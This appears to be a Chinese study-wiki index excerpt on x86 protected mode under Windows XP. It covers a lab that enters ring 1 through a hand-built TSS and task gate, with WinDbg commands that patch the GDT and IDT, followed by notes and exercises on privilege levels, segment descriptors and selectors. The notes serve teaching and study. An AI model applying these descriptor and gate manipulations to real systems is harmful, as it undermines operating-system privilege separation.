0;&#125;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //int 3 mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 iretd &#125;&#125;int main()&#123; char stack[100]=&#123;0&#125;; //找了一个局部变量的地址当堆栈堆栈用 DWORD cr3=0; //构造TSS，注释标有*说明为必填值 DWORD tss[0x68]=&#123; //0x68，104字节 0x00000000, //link，上一个任务的TR段选择子。在发生任务切换时CPU会自动填充 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * 跳转的地址 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000091, //cs * 1环：0x91 0x00000099, //ss * 1环：0x99 0x00000023, //ds * 0x000000a9, //fs * 1环：0xa9 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IO权限位图，VISTA之后不再用了，这是从现有的TSS结构体拷出来的 &#125;; //输出看((DWORD)stack) + 100的地址，后面用windbg看任务切换的esp作对比用 printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //修改GDT表 printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //因为变量声明顺序的问题，输入cr3的语句在这里。然后再赋给tss数组里的cr3字段 printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //执行该exe后，在WinDbg中用该指令获取：!process 0 0 tss[7]=cr3; __asm &#123; int 0x20 //索引号32，8003f500 //eq 8003f500 0000e500`004b0000 &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;总结一下要改的段描述符运行改GDT表指令用途eq 8003f090 00cfbb00`0000ffff1环代码段，cs:0x91eq 8003f098 00cfb300`0000ffff1环数据段，当堆栈用，ss:0x99eq 8003f0a8 ffc0b3df`f00000011环fs用，fs:0xa9看终端输出TSS段描述符改IDT表指令用途eq 8003f500 0000e500`004b0000任务门段描述符，int 0x20编译运行windbg下断，改GDT表和IDT表GDT表：1eq 8003f090 00cfbb00`0000ffff1eq 8003f098 00cfb300`0000ffff1eq 8003f0a8 ffc0b3df`f00000011eq 8003f048 0000e912`fd78006812345678910111213141516171819202122232425262728kd&gt; dq 8003f000 L168003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00000000`00000000 00000000`000000008003f0a0 8600893b`03500068 00000000`00000000kd&gt; eq 8003f090 00cfbb00`0000ffffkd&gt; eq 8003f098 00cfb300`0000ffffkd&gt; eq 8003f0a8 ffc0b3df`f0000001kd&gt; eq 8003f048 0000e912`fd780068kd&gt; dq 8003f000 L168003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0000e912`fd7800688003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00cfbb00`0000ffff 00cfb300`0000ffff8003f0a0 8600893b`03500068 ffc0b3df`f0000001IDT表：1eq 8003f500 0000e500`004b000012345678910111213141516171819202122232425262728293031323334353637kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000kd&gt; eq 8003f500 0000e500`004b0000kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 0000e500`004b0000使用!process 0 0查看该exe的DirBase，输入到终端cs是自己构造的1环，运行过程没蓝屏，实验成功加上int 3，执行1234567891011121314void __declspec(naked) func() &#123; dwOK=1; __asm &#123;+ int 3 mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 iretd &#125;&#125;windbg报错123456789101112131415161718192021*** Fatal System Error: 0x0000007f (0x00000008,0x80042000,0x00000000,0x00000000)Break instruction exception - code 80000003 (first chance)A fatal system error has occurred.Debugger entered on first try; Bugcheck callbacks have not been invoked.A fatal system error has occurred.Connected to Windows XP 2600 x86 compatible target at (Tue Aug 15 14:42:04.436 2023 (UTC + 8:00)), ptr64 FALSELoading Kernel Symbols.............................................................................Press ctrl-c (cdb, kd, ntsd) or ctrl-break (windbg) to abort symbol loads that take too long.Run !sym noisy before .reload to track down problems loading symbols.............................WARNING: Process directory table base 0C640380 doesn&#x27;t match CR3 00B18000WARNING: Process directory table base 0C640380 doesn&#x27;t match CR3 00B18000.....试了VC在int 0x20下断点，单步，情况一样。估计没法调小结实验中进1环用的是TSS中的ss和esp，而不是ss1和esp1。摘抄：esp 0 1 2的作用是用来指定 你使用任务门进1环后如果再发生由中断，调用门，陷阱门产生的权限切换的堆栈；使用任务段任务门本身过程中堆栈是由ESP和SS来决定的，和ESP 0 1 2没关系摘抄自评论区Mr.hack：任务门进1环-看雪"},{"title":"段权限检查","path":"/wiki/Protected_Mode/段权限检查.html","content":"CPU分级 为什么分级：安全。 特权指令运行在0环。 数值越小，权限越大。 windows x86保护模式只使用了0环和3环。驱动运行在0环，应用程序运行在3环。 这个是保护模式的概念，不涉及到操作系统的概念，不要弄混了。 CPL(Current Privilege Level) CPL(Current Privilege Level)，当前特权级。 CS和SS中存储的段选择子后两位。（CS和SS后两位一定是一样的，因为代码执行一定要用堆栈。如果代码和堆栈权限不一样，那不扯了吗？代码能跑？）。 所谓的程序是几环的就是看CS SS，而所谓的提权就是改CS SS，只要有一种方法能改掉CS SS，那就是提权。 比如随便拖一个exe到OD里，CS目前是001B，后两位是11，为3，所以程序在3环。 使用windbg下断后，会停留在0环的某个内核函数中。查看此时的CS寄存器，为8，后两位为00，程序在0环。 DPL(Descriptor Privilege Level) DPL(Descriptor Privilege Level)，描述符特权级别。 DPL存储在段描述符中，规定了访问该段所需要的特权级别是什么，高字节，13和14位。通俗的理解:如果你想访问我,那么你应该具备什么特权. 举例说明: 1mov ds,ax 如果AX指向的段DPL=0但当前程序的CPL =3，这行指令是不会成功的! RPL(Request Privilege Level) RPL(Request Privilege Level)，请求特权级别。 RPL是针对段选择子而言的，每个段的选择子都有自己的RPL。 举例： 12mov ax,0008\t;段选择子mov ds,ax 和 12mov ax,000B\t;段选择子mov ds,ax 两段代码指向的是同一个段描述符，但RPL不一样。 数据段的权限检查 数据段会做的权限检查: CPL&lt;=DPL并且RPL&lt;=DPL(数值上的比较)，才通过。 举例： 比如当前程序处于0环，也就是说CPL=O 12mov ax,000B //1011，RPL=3mov ds,ax //假设ax指向的段描述符的DPL=0 在这个例子中，CPL为0，DPL为0，RPL为3.CPL和DPL的检查通过，但RPL和DPL的检查不通过。 代码段和系统段描述符中的检查方式并不一样,后面会讲 总结 CPL：CPU当前的权限级别 DPL：如果你想访问我,你应该具备什么样的权限 RPL：用什么权限去访问一个段 为啥要有RPL? 类比：我们本可以用“读写”的权限去打开一个文件，但为了避免出错，有些时候我们使用“只读”的权限去打开。 练习 在3环能加载的数据段有哪些? 在0环能加载的数据段有哪些? 详细描述这下面代码的执行过程: 12mov ax,0x23mov ds,ax 题目1和题目2答案地址段描述符数据段or代码段DPL8003f01000cf9300`0000ffff数据段008003f02000cff300`0000ffff数据段118003f030ffc093df`f0000001数据段008003f0380040f300`00000fff数据段118003f0400000f200`0400ffff数据段118003f06000009302`2f40ffff数据段008003f0680000920b`80003fff数据段008003f070ff0092ff`700003ff数据段008003f08080009240`0000ffff数据段008003f08800009200`00000000数据段008003f0e800009200`0000ffff数据段008003f0f800009200`0000ffff数据段00题目3答案选择子0x230000 0000 0010 0011Index：0000 0000 0010 0，索引是4，第5个RPL：11TI：0，查GDT表1234kd&gt; dq 8003f000 L58003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffa00`0000ffff8003f020 00cff300`0000ffff00cff300`0000ffffDPL是11假设当前CPL是00CPL≤DPL，通过；RPL≤DPL，通过。允许假设当前CPL不是0CPL＞DPL，不通过；RPL≤DPL，通过。不允许"},{"title":"段描述符与段选择子","path":"/wiki/Protected_Mode/段描述符与段选择子.html","content":"段选择子 段选择子的RPL一定要&lt;=对应段描述符的DPL，否则试图使用该选择子加载对应段描述符的行为将由于权限不足而失败。 GDT和LDT 当执行类似如下指令时，CPU查表，来填充寄存器不可见的80位。 1mov ds,ax GDT表（全局描述符表），是一块内存，是CPU设计中要求操作系统提供的一块内存。该内存是操作系统在启动时填充的。使用windbg的命令可以查看gdt表的地址。 LDT（局部描述符表）。但是在windows中很少（也可能是没有）使用LDT。 GDT表在哪里？ gdtr寄存器（windbg伪寄存器，是windbg通过sgdt lgdt指令获取的.为了方便用户，才模拟了一个寄存器叫gdtr，实际是没有这个寄存器的）。 gdtr里存了两个值，GDT表的起始地址和长度。一共48位，32位表示GDT表存储在哪里，16位存储大小。 1r gdtr 查看gdtr寄存器的前32位也就是位置。 1r gdtl 查看gdtr寄存器的后16位也就是大小。 都是查gdtr。 4字节形式显示内存数据8字节形式显示内存数据查看固定数量以dword，4字节4字节地显示内存数据。 1dd xxxx 123456789kd&gt; dd 8003f0008003f000 00000000 00000000 0000ffff 00cf9b008003f010 0000ffff 00cf9300 0000ffff 00cffb008003f020 0000ffff 00cff300 200020ab 80008b048003f030 f0000001 ffc093df 00000fff 0040f3008003f040 0400ffff 0000f200 00000000 000000008003f050 af000068 80008954 af680068 800089548003f060 2f40ffff 00009302 80003fff 0000920b8003f070 700003ff ff0092ff 0000ffff 80009a40以qword，8字节8字节地显示内存数据。 1dq XXXX 123456789kd&gt; dq 8003f0008003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff查看固定数量元素的内存。 1dq xxxx Lnum 40是十六进制数，显示40H=64D个 一行两个，所以00~f0行 123456789101112131415161718192021222324252627282930313233kd&gt; dq 8003f000 L408003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00000000`00000000 00000000`000000008003f0a0 8200891b`23500068 00000000`000000008003f0b0 00000000`00000000 00000000`000000008003f0c0 00000000`00000000 00000000`000000008003f0d0 00000000`00000000 00000000`000000008003f0e0 f8009f71`a000ffff 00009200`0000ffff8003f0f0 8000984f`b68803b7 00009200`0000ffff8003f100 f8409339`7400ffff f8409339`7400ffff8003f110 f8409339`7400ffff 00000000`8003f1208003f120 00000000`8003f128 00000000`8003f1308003f130 00000000`8003f138 00000000`8003f1408003f140 00000000`8003f148 00000000`8003f1508003f150 00000000`8003f158 00000000`8003f1608003f160 00000000`8003f168 00000000`8003f1708003f170 00000000`8003f178 00000000`8003f1808003f180 00000000`8003f188 00000000`8003f1908003f190 00000000`8003f198 00000000`8003f1a08003f1a0 00000000`8003f1a8 00000000`8003f1b08003f1b0 00000000`8003f1b8 00000000`8003f1c08003f1c0 00000000`8003f1c8 00000000`8003f1d08003f1d0 00000000`8003f1d8 00000000`8003f1e08003f1e0 00000000`8003f1e8 00000000`8003f1f08003f1f0 00000000`8003f1f8 00000000`8003f200 段描述符 GDT表中存储着段描述符，每一个段描述符8个字节。下图上面的32位是高字节，下面32位是低字节。 当执行mov ds,ax指令时，除了给可见部分赋值。此时ax充当段选择子，根据段选择子中字段，去查GDT或LDT表，来填充不可见的80位。 123456789struct SegMent&#123; //可见 WORD Selector;//16位Selector。就是段选择子的值。 //不可见 WORD Attributes;//16位Attributes。从段描述符的G位到Type位。 DWORD Base;//32位Base。段描述符的3个Base拼接而成，高字节31:24拼接7:0拼接低字节31:16。 DWORD Limit;//32位Limit。段描述符的2个SegLimit拼接而成，高字节19:16拼接低字节16:0，当G位为0时，单位为字节，高位补3个0。G位为1时，低位补FFF。&#125; 图片来源：【2021.03.12】段描述符属性：P位、G位 加载段描述符至段寄存器 加载段描述符至段寄存器的指令共有三种： 使用mov指令 1mov ss,ax 使用LES、LSS、LDS、LFS、LGS指令修改对应的寄存器 CS不能通过上述指令进行修改。CS为代码段，CS的改变会导致EIP的改变，要改CS，必须要保证CS与EIP同时改，后文会讲解如何修改CS并在需要时提升权限。 学习顺序 Base，Limit P位、G位 P位如果为1，则有效，看S位，分代码段或数据段，还是系统段 在学TYPE域，分段属性 学DB位 学DPL 段描述符各flags and fields介绍 P (segment-present) flag 为1时，表示该段描述符有效。 为0时，表示该段描述符无效。 当描述符无效时，任何尝试加载该描述符、访问该描述符对应的段间地址都会报错。 Segment limit field Specifies the size of the segment. The processor puts together the two segment limit fields to form a 20-bit value. The processor interprets the segment limit in one of two ways, depending on the setting of the G (granularity) flag: • If the granularity flag is clear, the segment size can range from 1 byte to 1 MByte, in byte increments.G=0，高位补000 • If the granularity flag is set, the segment size can range from 4 KBytes to 4 GBytes, in 4-KByte increments.G=1，低位补FFF G (granularity) flag 段对齐粒度。 也就是决定了Limit大小的一个位。 在上文填充段寄存器隐藏部分（C语言结构体）时，Limit在段描述符中只有5个16进制位，而结构体中Limit是32位，剩下的3个16进制位由看G位决定。 当G为0时，整个段将以字节对齐，Limit大小单位为字节，所以精确到1。Limit直接就是段长。段寄存器中的Limit高位补0。 当G为1时，整个段将以4KB对齐，Limit大小单位为4KB。4KB=4096D，（4096个，地址计算要减1），就是4095D=FFF，所以段的末尾处一定是以FFF结尾。段寄存器中的Limit低位补FFF。？ 如果G = 0，说明段描述符中的Limit的单位是字节，段长度Limit范围可从1B～1MB，即在20位的前面补3个0即可；如果G = 1，说明段描述符中的Limit的单位是字节为4KB，即段长度Limit范围可从4KB～4GB，在20位的后面补充FFF即可。 举个例子，如果Limit拼接后的为FFFFF，如果G为0则为000FFFFF，如果G为1则为FFFFFFF。 当G=0时，Limit的范围是0x00000000-0x000FFFFF，其中，段描述符的20位在低位，高位补0. 当G=1时，Limit的范围是0x00000FFF-0xFFFFFFFF，其中，段描述符的20位在高位，低位补F。 参考：（4）段描述符P,G位 S (descriptor type) flag S = 1，代码段或者数据段描述符， S = 0，系统段描述符。 快速判断一个段描述符是否是代码段或数据段：看高字节的15~12位，第4个十六进制数。 DPL只有两种可能：全为0，或全为1。 P必须=1，表示这个段描述符有效。 S=1，表示是代码段或数据段。 所以可能的情况只有：1001,1111。9和f 看GDT表时，看高字节的第4个十六进制数，是9或f，就是代码段或数据段。 Type field S=1 当S=1时。表示该段是代码段或数据段。 接着看TYPE域的第11位，第11位为1，表示代码段。第11位为0，表示数据段。 十六进制＜8，数据段。十六进制≥8，代码段。 举个例子： 00cf9300`0000ffff，从左往右第5个数字是9，所以是代码段或数据段。从左往右第6个数字是3，小于8，所以是数据段。 00cf9b00`0000ffff，从左往右第5个数字是9，所以是代码段或数据段。从左往右第6个数字是b，≥8，所以是代码段。 当S位=1，TYPE域11位为0，数据段： 属性 含义 为1 为0 备注 A 访问位。数据段是否被访问过。 访问过，accessed 未访问过 操作系统刚启动，段描述符是没有被加载过的，所以A位一定是0 W 可写位。数据段是否可写。 可写 不可写 E 向下拓展位。 expand-down expand-up fs.base表示段的起始地址，Limit是段长。 向上拓展（左），表示有效区域是fs.base到fs.base+Limit之间的区域，其余区域无效。 向下拓展（右），表示无效区域是fs.base到fs.base+Limit之间的区域，其余区域有效。 当S位=1，TYPE域控11位为1，代码段： 属性 含义 为1 为0 备注 A 访问位。数据段是否被访问过。 访问过，accessed 未访问过 操作系统刚启动，段描述符是没有被加载过的，所以A位一定是0 R 可读位 可读 不可读 C 一致位 一致代码段 非一致代码段 代码段都是可以执行的，Execute The accessed bit indicates whether the segment has been accessed since the last time the operating-system or executive cleared the bit. The processor sets this bit whenever it loads a segment selector for the segment into a segment register, assuming that the type of memory that contains the segment descriptor supports processor writes. The bit remains set until explicitly cleared. This bit can be used both for virtual memory management and for debugging 访问位（Accessed bit）表示自操作系统或执行体上次清除此位以来，段是否已被访问。只要将段选择器加载到段寄存器中，处理器就会设置此位，前提是包含段描述符的内存类型支持处理器写入。此位保持设置状态，直到被明确清除。该位既可以用于虚拟内存管理，也可以用于调试。 S=0 当S=0时。该段为系统描述符。系统描述符分为如下类型： D/B (default operation size/default stack pointer size and/or upper bound) flag 段描述符加载到不同的段寄存器，DB位对不同段的影响是不同的，情况如下： 对CS段的影响（Executable code segment） D的值 情况 1 采用32位寻址方式 0 采用16位寻址方式 对SS段的影响（Stack segment (data segment pointed to by the SS register)） D的值 情况 1 隐式堆栈访问指令（如：PUSH POP CALL）使用32位堆栈指针寄存器ESP 0 隐式堆栈访问指令（如：PUSH POP CALL）使用16位堆栈指针寄存器SP 隐式堆栈访问指令：这些指令使用时都要改变堆栈的值 向下拓展的数据段（Expand-down data segment.） D的值 情况 1 段上限为4GB 0 段上限为64KB The flag is called the B flag and it specifies the upper bound of the segment. If the flag is set, the upper bound is FFFFFFFFH (4 GBytes); if the flag is clear, the upper bound is FFFFH (64 KBytes) 红色表示向下拓展能寻址的范围。可以看出，如果D = 0，最大寻址范围变成了64KB。 AVL（Available and reserved bits） AVL指示是否可供系统软件使用，由操作系统来使用，CPU并不使用它。 Bit 20 of the second doubleword of the segment descriptor is available for use by system software. 练习 加载段描述符至段寄存器练习 自行选一个段描述符，自己构造一个段选择子，并用如下代码模板使用les、lss、lds、lfs、lgs修改对应的段寄存器。 12345678char buffer[6];//自己构造一个段选择子//自己自行赋值，你构造的的段描述符位置不一样，段选择子就不一样_asm&#123; les ecx,fword ptr ds:[buffer] //高2个字节给es，低四个字节给ecx&#125; 注意：RPL&lt;=DPL（在数值上） 答案因为写的C语言程序在3环，CPL是3，只能找DPL为3的，要不CPL和DPL的检查过不去。我本来找索引为4的段描述符，构造完的段选择子是0x23，但调试时DS、ES、SS本来就是0x23，看不到变化，就又换了一个段描述符。另外，3环FS本来就是0x3B。我选的索引为7的段描述符：序号地址段描述符数据段or代码段DPL78003f0380040f300`00000fff数据段11构造段选择子：索引为7，RPL为11，查GDT表0000 0000 0011 1 0 110000 0000 0011 1011Selector：0x3b注意小端存储。buffer数组里的顺序1234567891011#include &lt;stdio.h&gt;int main(void)&#123; //段选择子：0000 0000 0011 1011 char buffer[6]=&#123;0xff,0xff,0xff,0xff,0x3b,0x00&#125;;//注意小端序，前面4个字节随便写的 _asm &#123; les ecx,fword ptr ds:[buffer] //高2个字节给es，低四个字节给ecx &#125; return 0;&#125;执行les指令前执行les指令后lss、lds、lgs同理，把les换一下lfs的buffer用下面这个，段选择子换成0x23，因为它本来是0x3b1char buffer[6]=&#123;0xff,0xff,0xff,0xff,0x23,0x00&#125;; 拆分练习 段描述符拆分练习 以00cf9b00`0000ffff为例，进行拆分。 答案高字节：Base 31:24 ：00G：1D/B：1L：0AVL：0Seg. Limit 19:16：fP：1DPL：00S：1Type：bBase 23:16：00低字节：Base Address 15:00 ：0000Segment Limit 15:00：ffff 段选择子拆分练习 0023，002B，0030，003B 答案00230000 0000 0010 0011Index：0000 0000 0010 0.索引是4，查GDT表中的第5个TI：0RPL：11002B0000 0000 0010 1011Index：0000 0000 0010 1TI：0RPL：1100300000 0000 0011 0000Index：0000 0000 0011 0TI：0RPL：00003B0000 0000 0011 1011Index：0000 0000 0011 1TI：0RPL：1100530000 0000 0101 0011Index：0000 0000 0101 0TI：0RPL：11 段描述符属性P位G位课堂练习 参考：段描述符属性P位和G位 查GDT表，如何快速确定哪个描述符的P位为0或者为1 答案看高字节的第15位。高字节第4个十六进制数是否≥8，≥8，P位为1，小于8，P位为0比如下图左边一组高位第4个十六进制数是：0，9，f，9，f，8，9，9，9，0，8，0，0，0，9P位就是：0，1，1，1，1，1，1，1，1，0，1，0，0，0，1 查GDT表如何快速确定哪个描述符的G位为0或者为1 答案看高字节的第23位比如下图左边一组高位第6个十六进制数是：0，c，c，c，0，0，0，0，0，0，0，0，0，0，0G位就是：0，1，1，1，0，0，0，0，0，0，0，0，0，0，0 将段描述符填写到段寄存器结构体中(每人填一个) 例子1例：0x2B作为段选择子。0000 0000 0010 1011所以Index：0000 0000 0010 1，十进制5TI：0，查GDT表RPL：11，请求特权级别为3，最小1234kd&gt; dq 8003f000 L68003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab索引为5，0，1，2，3，4，5所以对应的段描述符是80008b04`200020ab123456789struct SegMent&#123; //可见 WORD Selector;//16位Selector。就是段选择子的值。 //不可见 WORD Attributes;//16位Attributes。从段描述符的G位到Type位。 DWORD Base;//32位Base。段描述符的3个Base拼接而成，高字节31:24拼接7:0拼接低字节31:16。 DWORD Limit;//32位Limit。段描述符的2个SegLimit拼接而成。当G位为0时，单位为字节，高位补3个0。G位为1时，低位补FFF。&#125;Selector=2BAttributes=008bBase=80042000Limit=000020abG=0例子2例：0x23作为段选择子。0000 0000 0010 0011所以Index：0000 0000 0010 0，十进制4TI：0，查GDT表RPL：11，请求特权级别为3，最小1234kd&gt; dq 8003f000 L68003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab索引为4，0，1，2，3，4所以对应的段描述符是00cff300`0000ffff123456789struct SegMent&#123; //可见 WORD Selector;//16位Selector。就是段选择子的值。 //不可见 WORD Attributes;//16位Attributes。从段描述符的G位到Type位。 DWORD Base;//32位Base。段描述符的3个Base拼接而成，高字节31:24拼接7:0拼接低字节31:16。 DWORD Limit;//32位Limit。段描述符的2个SegLimit拼接而成。当G位为0时，单位为字节，高位补3个0。G位为1时，低位补FFF。&#125;Selector=23Attributes=cff3Base=00000000Limit=ffffffff例子3例：0x53作为段选择子。0000 0000 0101 0011所以Index：0000 0000 0101 0，十进制10TI：0，查GDT表RPL：11，请求特权级别为3，最小1234567kd&gt; dq 8003f000 LB8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffa00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068索引为10，第11个所以对应的段描述符是80008954`af000068123456789struct SegMent&#123; //可见 WORD Selector;//16位Selector。就是段选择子的值。 //不可见 WORD Attributes;//16位Attributes。从段描述符的G位到Type位。 DWORD Base;//32位Base。段描述符的3个Base拼接而成，高字节31:24拼接7:0拼接低字节31:16。 DWORD Limit;//32位Limit。段描述符的2个SegLimit拼接而成。当G位为0时，单位为字节，高位补3个0。G位为1时，低位补FFF。&#125;Selector=53Attributes=0089Base=8054af00Limit=00000068G=0 段描述符属性S位TYPE域 找出所有数据段，并分析该段属性:只读、已访问、可读可写、拓展方向 找出所有代码段，并分析该段属性:只执行、可读可执行、已访问、一致代码 找出所有系统段,并分析属性. 答案1234kd&gt; r gdtrgdtr=8003f000kd&gt; r gdtlgdtl=000003ff大小是000003ff，1023字节。每个段描述符8字节总长度/每个的长度=个数1024/8=128个，80H1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465kd&gt; dq 8003f000 L808003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffa00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00000000`00000000 00000000`000000008003f0a0 00000000`00000000 00000000`000000008003f0b0 00000000`00000000 00000000`000000008003f0c0 00000000`00000000 00000000`000000008003f0d0 00000000`00000000 00000000`000000008003f0e0 00000000`8003f100 00009200`0000ffff8003f0f0 8000984f`b68803b7 00009200`0000ffff8003f100 00000000`8003f108 00000000`8003f1108003f110 00000000`8003f118 00000000`8003f1208003f120 00000000`8003f128 00000000`8003f1308003f130 00000000`8003f138 00000000`8003f1408003f140 00000000`8003f148 00000000`8003f1508003f150 00000000`8003f158 00000000`8003f1608003f160 00000000`8003f168 00000000`8003f1708003f170 00000000`8003f178 00000000`8003f1808003f180 00000000`8003f188 00000000`8003f1908003f190 00000000`8003f198 00000000`8003f1a08003f1a0 00000000`8003f1a8 00000000`8003f1b08003f1b0 00000000`8003f1b8 00000000`8003f1c08003f1c0 00000000`8003f1c8 00000000`8003f1d08003f1d0 00000000`8003f1d8 00000000`8003f1e08003f1e0 00000000`8003f1e8 00000000`8003f1f08003f1f0 00000000`8003f1f8 00000000`8003f2008003f200 00000000`8003f208 00000000`8003f2108003f210 00000000`8003f218 00000000`8003f2208003f220 00000000`8003f228 00000000`8003f2308003f230 00000000`8003f238 00000000`8003f2408003f240 00000000`8003f248 00000000`8003f2508003f250 00000000`8003f258 00000000`8003f2608003f260 00000000`8003f268 00000000`8003f2708003f270 00000000`8003f278 00000000`8003f2808003f280 00000000`8003f288 00000000`8003f2908003f290 00000000`8003f298 00000000`8003f2a08003f2a0 00000000`8003f2a8 00000000`8003f2b08003f2b0 00000000`8003f2b8 00000000`8003f2c08003f2c0 00000000`8003f2c8 00000000`8003f2d08003f2d0 00000000`8003f2d8 00000000`8003f2e08003f2e0 00000000`8003f2e8 00000000`8003f2f08003f2f0 00000000`8003f2f8 00000000`8003f3008003f300 00000000`8003f308 00000000`8003f3108003f310 00000000`8003f318 00000000`8003f3208003f320 00000000`8003f328 00000000`8003f3308003f330 00000000`8003f338 00000000`8003f3408003f340 00000000`8003f348 00000000`8003f3508003f350 00000000`8003f358 00000000`8003f3608003f360 00000000`8003f368 00000000`8003f3708003f370 00000000`8003f378 00000000`8003f3808003f380 00000000`8003f388 00000000`8003f3908003f390 00000000`8003f398 00000000`8003f3a08003f3a0 00000000`8003f3a8 00000000`8003f3b08003f3b0 00000000`8003f3b8 00000000`8003f3c08003f3c0 00000000`8003f3c8 00000000`8003f3d08003f3d0 00000000`8003f3d8 00000000`8003f3e08003f3e0 00000000`8003f3e8 00000000`8003f3f08003f3f0 00000000`8003f3f8 